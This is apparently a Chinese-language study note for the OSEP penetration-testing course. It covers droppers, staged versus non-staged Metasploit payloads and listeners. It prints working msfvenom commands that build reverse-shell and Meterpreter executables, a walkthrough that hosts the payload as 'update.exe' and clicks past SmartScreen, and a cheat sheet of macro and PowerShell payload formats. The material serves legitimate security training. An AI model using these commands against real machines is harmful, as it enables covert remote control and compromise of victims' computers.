---
title: OSEP-03-Dropper基础
description: '03-Office宏攻击 | 04-Dropper基础'
pubDate: 2026-01-30T00:00:13+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Windows Learning
  - Exploit Development
  - Phishing
---

# Dropper 基础 - 从零理解恶意软件投递

## 写在前面

如果你是 Web 安全背景，可以这样理解：
- **Dropper** 就像是一个"文件上传漏洞利用工具"，但它运行在客户端
- **Payload** 就像是你上传的 Webshell
- **C2 服务器** 就像是你连接 Webshell 的客户端

---

## 第一部分：什么是 Dropper？

### 1.1 通俗解释

想象你要给朋友寄一个大包裹，但快递公司有重量限制。你可以：
1. **方案 A**：把所有东西打包成一个大包裹（可能超重被拒）
2. **方案 B**：先寄一个小包裹，里面放一张纸条，告诉朋友去某个地方取大包裹

**Dropper 就是方案 B 中的那个小包裹**。

### 1.2 技术定义

**Dropper（投递器）** 是一种恶意软件，它的主要功能是：
1. 在目标系统上建立初始立足点
2. 下载并执行更大、更复杂的恶意载荷（Payload）

```
攻击流程图：

┌─────────────┐     ┌─────────────┐     ┌─────────────┐
│   攻击者    │────▶│   Dropper   │────▶│   Payload   │
│  (Kali)     │     │  (小而简单)  │     │  (大而复杂)  │
└─────────────┘     └─────────────┘     └─────────────┘
                          │
                          │ Dropper 的特点：
                          │ 1. 体积小，容易传递
                          │ 2. 功能简单，不易被检测
                          │ 3. 负责下载真正的恶意代码
```

### 1.3 为什么需要 Dropper？

#### 原因 1：绕过大小限制

很多传输渠道有大小限制：
- 邮件附件通常限制 10-25MB
- 某些协议有数据包大小限制
- 大文件更容易被安全设备检测

#### 原因 2：减少检测面

```
完整 Payload 的特征：
┌────────────────────────────────────────┐
│ ████████████████████████████████████  │ ← 很多特征码
│ 杀软可以匹配的特征很多                   │
└────────────────────────────────────────┘

Dropper 的特征：
┌──────────┐
│ ████     │ ← 特征码很少
│ 简单功能  │
└──────────┘
```

#### 原因 3：灵活性

- Dropper 可以根据环境动态下载不同的 Payload
- 可以检测是否在沙箱中运行
- 可以检测目标系统架构（32位/64位）

---

## 第二部分：Staged vs Non-Staged Payload

**这是 OSEP 中非常重要的概念！考试必考！**

### 2.1 Non-Staged（非分阶段）Payload

```
┌─────────────────────────────────────────────────┐
│                完整的 Payload                    │
│  ┌─────────────────────────────────────────┐   │
│  │ 连接代码 + 功能代码 + 所有依赖 = 一个大文件 │   │
│  └─────────────────────────────────────────┘   │
│                                                 │
│  优点：一次性传输，不需要额外网络连接            │
│  缺点：体积大，特征多，容易被检测                │
└─────────────────────────────────────────────────┘
```

**Metasploit 命名规则**：使用下划线 `_`
```
windows/shell_reverse_tcp          ← 非分阶段（注意下划线）
windows/meterpreter_reverse_https  ← 非分阶段
```

### 2.2 Staged（分阶段）Payload

```
第一阶段 (Stage 0 / Stager)
┌──────────────┐
│ 小型连接代码  │ ──────▶ 连接攻击者服务器
│ (~500 bytes) │         下载第二阶段
└──────────────┘

        │
        │ 网络传输
        ▼

第二阶段 (Stage 1)
┌─────────────────────────────────────────┐
│           完整的功能代码                  │
│  (Meterpreter 完整功能，约 200KB)        │
└─────────────────────────────────────────┘
```

**Metasploit 命名规则**：使用斜杠 `/`
```
windows/shell/reverse_tcp          ← 分阶段（注意斜杠）
windows/meterpreter/reverse_https  ← 分阶段
```

### 2.3 对比表

| 特性 | Non-Staged | Staged |
|------|-----------|--------|
| 体积 | 大 (200KB+) | 小 (几百字节) |
| 网络依赖 | 一次连接 | 需要多次连接 |
| 检测难度 | 容易被检测 | 较难被检测 |
| 稳定性 | 更稳定 | 依赖网络 |
| 监听器 | Netcat 可用 | 必须用 multi/handler |
| 使用场景 | 网络不稳定时 | 需要绕过检测时 |

### 2.4 如何记忆？

```
记忆口诀：
"下划线是一整块，斜杠分成两半来"

windows/meterpreter_reverse_tcp   ← 下划线 = 一整块 = Non-staged
windows/meterpreter/reverse_tcp   ← 斜杠 = 分两半 = Staged
```

---

## 第三部分：Metasploit 实战

### 3.1 环境准备

```bash
# 攻击机：Kali Linux
# 目标机：Windows 10

# 确认攻击机 IP 地址
ip addr show eth0
# 假设攻击机 IP: 192.168.119.120
```

### 3.2 生成 Non-Staged Payload

```bash
# 生成一个非分阶段的反向 TCP Shell
msfvenom -p windows/shell_reverse_tcp \
    LHOST=192.168.119.120 \
    LPORT=4444 \
    -f exe \
    -o shell_nonstaged.exe

# ========== 参数详解 ==========
# -p : 指定 payload 类型
#      windows/shell_reverse_tcp 是一个非分阶段的 Windows CMD shell
#
# LHOST : 攻击者 IP（监听地址）
#         这是目标机器要连接的地址
#
# LPORT : 攻击者端口（监听端口）
#         这是目标机器要连接的端口
#
# -f : 输出格式
#      exe = Windows 可执行文件
#      其他常用格式：dll, ps1, vbapplication, raw, c, csharp
#
# -o : 输出文件名
```

**输出示例**：
```
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes    ← 约 72KB
Saved as: shell_nonstaged.exe
```

### 3.3 生成 Staged Payload

```bash
# 生成一个分阶段的 Meterpreter HTTPS Shell
msfvenom -p windows/meterpreter/reverse_https \
    LHOST=192.168.119.120 \
    LPORT=443 \
    -f exe \
    -o meterpreter_staged.exe

# 注意：payload 名称中的 / 表示这是分阶段的
# windows/meterpreter/reverse_https
#                   ↑
#                 斜杠 = 分阶段
```

**输出示例**：
```
Payload size: 694 bytes           ← 注意：只有 694 字节！
Final size of exe file: 7168 bytes    ← 约 7KB
Saved as: meterpreter_staged.exe
```

### 3.4 对比两个文件大小

```bash
ls -la *.exe

# 输出：
# -rw-r--r-- 1 kali kali 73802 shell_nonstaged.exe    ← 约 72KB
# -rw-r--r-- 1 kali kali  7168 meterpreter_staged.exe ← 约 7KB

# 分阶段 Payload 小了 10 倍！
```

---

## 第四部分：设置监听器

### 4.1 方法一：Netcat（仅适用于 Non-Staged Shell）

```bash
# 监听 4444 端口
nc -lnvp 4444

# ========== 参数详解 ==========
# -l : 监听模式（listen）
# -n : 不进行 DNS 解析（numeric-only）
# -v : 详细输出（verbose）
# -p : 指定端口（port）
```

**重要提醒**：
```
⚠️ Netcat 只能接收 Non-Staged Payload！

为什么？
因为 Staged Payload 的第一阶段连接后，需要监听器发送第二阶段代码。
Netcat 只是简单地接收连接，不会发送任何数据。
```

### 4.2 方法二：Metasploit multi/handler（通用）

```bash
# 启动 Metasploit（-q 表示安静模式，不显示 banner）
msfconsole -q

# 使用 multi/handler 模块
msf6 > use multi/handler

# 设置 payload（必须与生成时一致！）
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_https

# 设置监听地址和端口
msf6 exploit(multi/handler) > set LHOST 192.168.119.120
msf6 exploit(multi/handler) > set LPORT 443

# 开始监听
msf6 exploit(multi/handler) > exploit
# 或者
msf6 exploit(multi/handler) > run
```

**输出示例**：
```
[*] Started HTTPS reverse handler on https://192.168.119.120:443
```

### 4.3 监听器选择指南

```
选择监听器的决策树：

                    你的 Payload 是什么类型？
                            │
              ┌─────────────┴─────────────┐
              │                           │
         Non-Staged                    Staged
              │                           │
    ┌─────────┴─────────┐                │
    │                   │                │
  简单 shell      Meterpreter      必须用 multi/handler
    │                   │
 可用 Netcat      必须用 multi/handler
```

---

## 第五部分：完整攻击流程演示

### 步骤 1：生成 Payload

```bash
# 在 Kali 上生成 staged meterpreter
msfvenom -p windows/meterpreter/reverse_https \
    LHOST=192.168.119.120 \
    LPORT=443 \
    -f exe \
    -o /var/www/html/update.exe

# 启动 Web 服务器（用于目标下载 payload）
sudo systemctl start apache2

# 验证文件是否可访问
curl -I http://192.168.119.120/update.exe
```

### 步骤 2：设置监听器

```bash
# 新开一个终端
msfconsole -q

use multi/handler
set payload windows/meterpreter/reverse_https
set LHOST 192.168.119.120
set LPORT 443
exploit
```

### 步骤 3：目标执行 Payload

在 Windows 目标机上：
1. 打开浏览器访问 `http://192.168.119.120/update.exe`
2. 下载并运行 `update.exe`
3. 可能需要点击"仍要运行"绕过 SmartScreen

### 步骤 4：获得 Shell

```
[*] https://192.168.119.120:443 handling request from 192.168.120.11
[*] Staging x86 payload (207449 bytes) ...  ← 正在传输第二阶段
[*] Meterpreter session 1 opened

meterpreter > getuid
Server username: DESKTOP-XXX\victim

meterpreter > sysinfo
Computer        : DESKTOP-XXX
OS              : Windows 10 (10.0 Build 19041)
Architecture    : x64

meterpreter > shell
Process 1234 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19041.1]
(c) Microsoft Corporation. All rights reserved.

C:\Users\victim\Downloads>
```

---

## 第六部分：常用 Payload 类型速查表

### Windows Payload

| Payload | 说明 | 使用场景 |
|---------|------|---------|
| `windows/shell_reverse_tcp` | 简单 CMD shell (Non-staged) | 快速测试 |
| `windows/shell/reverse_tcp` | 简单 CMD shell (Staged) | 绕过检测 |
| `windows/meterpreter/reverse_tcp` | Meterpreter TCP (Staged) | 功能强大 |
| `windows/meterpreter/reverse_https` | Meterpreter HTTPS (Staged) | 加密通信 |
| `windows/x64/meterpreter/reverse_https` | 64位 Meterpreter | 64位系统 |

### 输出格式

| 格式 | 说明 | 用途 |
|------|------|------|
| `exe` | Windows 可执行文件 | 直接运行 |
| `dll` | 动态链接库 | DLL 注入 |
| `ps1` | PowerShell 脚本 | 无文件攻击 |
| `vbapplication` | VBA 代码 | Office 宏 |
| `raw` | 原始 shellcode | 自定义加载器 |
| `c` | C 语言数组 | 嵌入 C 程序 |
| `csharp` | C# 数组 | .NET 程序 |

---

## 第七部分：关键概念总结

### 7.1 Callback（回调）

```
为什么用回调（反向连接）而不是正向连接？

正向连接（Bind Shell）：
┌─────────────┐                    ┌─────────────┐
│   攻击者    │─────── 连接 ──────▶│   目标      │
│  (公网 IP)  │                    │  (内网 IP)  │
└─────────────┘                    └─────────────┘
                                         ↑
                                    目标在内网
                                    攻击者无法直接连接！

反向连接（Reverse Shell）：
┌─────────────┐                    ┌─────────────┐
│   攻击者    │◀───── 回调连接 ─────│   目标      │
│  (公网 IP)  │                    │  (内网 IP)  │
└─────────────┘                    └─────────────┘
       ↑
  攻击者有公网 IP
  目标可以主动连接过来！
```

### 7.2 C2（Command and Control）

命令与控制基础设施，用于：
- 接收 Payload 的回调连接
- 向 Payload 发送命令
- 接收执行结果

### 7.3 Implant / Agent / Beacon

运行在目标系统上的恶意代码，负责：
- 与 C2 保持通信
- 执行 C2 下发的命令
- 收集和回传数据

---

## 第八部分：练习题

### 练习 1：生成不同类型的 Payload

生成以下 Payload 并比较它们的大小：
1. `windows/shell_reverse_tcp` (non-staged)
2. `windows/shell/reverse_tcp` (staged)
3. `windows/meterpreter_reverse_https` (non-staged)
4. `windows/meterpreter/reverse_https` (staged)

### 练习 2：使用不同监听器

1. 使用 Netcat 接收 `windows/shell_reverse_tcp`
2. 使用 multi/handler 接收 `windows/meterpreter/reverse_https`

### 练习 3：思考题

为什么 staged payload 需要使用 multi/handler 而不能用 Netcat？

<details>
<summary>点击查看答案</summary>

因为 staged payload 的第一阶段只是一个简单的下载器，它连接到监听器后，需要监听器发送第二阶段的代码。

Netcat 只是简单地接收连接，不会发送任何数据，所以无法完成第二阶段的传输。

multi/handler 知道如何处理 staged payload：
1. 接收第一阶段的连接
2. 识别 payload 类型
3. 发送对应的第二阶段代码
4. 建立完整的通信通道

</details>

---

## 第九部分：本节代码汇总

### 生成 Payload

```bash
# Non-staged shell
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o shell.exe

# Staged meterpreter
msfvenom -p windows/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> -f exe -o meterpreter.exe

# 64位 staged meterpreter
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> -f exe -o meterpreter64.exe

# VBA 格式（用于 Office 宏）
msfvenom -p windows/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f vbapplication

# PowerShell 格式
msfvenom -p windows/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f ps1

# C# 格式
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> -f csharp
```

### 设置监听器

```bash
# Netcat（仅 non-staged）
nc -lnvp <PORT>

# Metasploit multi/handler
msfconsole -q
use multi/handler
set payload <PAYLOAD_NAME>
set LHOST <IP>
set LPORT <PORT>
exploit
```

---

## 下一步

掌握了 Dropper 的基础概念后，继续学习 [05-HTML-Smuggling.md](/blog/osep/03-office宏攻击/05-html-smuggling/)，了解如何通过 HTML 页面投递恶意文件。
